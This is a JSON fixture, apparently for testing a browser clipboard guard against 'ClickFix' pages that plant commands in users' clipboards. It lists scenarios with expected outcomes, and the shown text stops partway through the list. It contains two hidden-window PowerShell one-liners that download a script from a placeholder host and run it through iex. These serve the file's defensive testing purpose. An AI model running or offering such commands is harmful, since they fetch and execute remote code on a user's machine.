{
  "_comment": "ClickFix smoke scenarios. Each is driven by clipguard_test.py against a built Whisper over Marionette, with the pages served from two loopback origins (no network). trigger: click (synthesize a click in the page), ctrlc (click then Ctrl+C). expectClipboard: placeholder = Whisper's blocked-copy placeholder; command = the real command text; prose = the visible text. pageSaw: success = the page's writeText/execCommand reported success (the page must not learn the decision). Addresses are *.invalid or RFC 5737; nothing is executed.",
  "malicious": [
    {
      "page": "click_writetext.html",
      "trigger": "click",
      "command": "powershell -w hidden -c \"iwr https://evil.invalid/a.ps1 | iex\"",
      "expectClipboard": "placeholder",
      "pageSaw": "success"
    },
    {
      "page": "click_writeitem.html",
      "trigger": "click",
      "command": "irm https://evil.invalid/x | iex",
      "expectClipboard": "placeholder",
      "pageSaw": "success"
    },
    {
